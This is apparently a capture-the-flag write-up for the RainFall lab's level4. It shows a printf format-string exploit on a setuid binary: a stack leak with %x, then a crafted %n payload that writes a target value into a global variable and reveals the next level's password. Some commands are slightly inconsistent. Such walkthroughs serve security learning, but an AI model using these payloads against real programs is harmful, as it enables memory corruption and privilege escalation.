level4
======

*	We spawn with a [level4](source/level4) executable
	```console
	level4@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
	level4@RainFall:~$ ./level4
	█
	level4@RainFall:~$ ./level4 
	dsadasd
	dsadasd
	```
*	Let's take a look at the code
	```console
	root@DESKTOP-69N2SL4:~# scp -P 4242 level4@192.168.29.4:~/level4 .
	root@DESKTOP-69N2SL4:~# ./getFunctions.sh 
	Executable files in the current directory:
	[1] ./level4
	Enter the number of the executable file you want to analyze: 1
	```
*	It seems there is 3 functions -> `main`, `p` and `n`. Even though the code isn't complex, for understanding purposes, I'll use ghidra to convert it to `C` in [level4.c](source/level4.c)
*	To summarize :
	-	`main` calls function `n` then return 
	-	`n` function uses `fgets` and calls `printf` with `p` on what you gave
	-	if the global variable `m` is equal to `0x1025544`, the function `cat` the password for the next level
*	I tried to do like [level3](../level3/) and found our argument at position 12
	```console
	level4@RainFall:~$ ./level4 
	aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x
	aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
	```
*	Now let's retrieve the little endian address of `m (0x8049810)` -> `\x10\x98\x04\x08`
*	Let's try to print it with the program
	```console
	level4@RainFall:~$ python -c 'print "\x44\x55\x25\x10" + " %x "*12' > /tmp/test
	level4@RainFall:~$ cat /tmp/test | ./level4 
	DU% b7ff26b0  bffff794  b7fd0ff4  0  0  bffff758  804848d  bffff550  200  b7fd1ac0  b7ff37d0  10255544 
	```
	It seems to be working
*	The issue here is that padding of `0x1025544(int 16930116)`is too long so we need one more thing to specify the right field, we will be using the `%d` modifier like in the last level -> `%16930116d`. Let's not forget to remove `4` because of the base address size so it will be `%16930112d`
*	Let's try this and don't forget to change the `12th` position with `%n`:
	```console
	level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/test
	level4@RainFall:~$ cat /tmp/exploit | ./level4
	...
	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
	```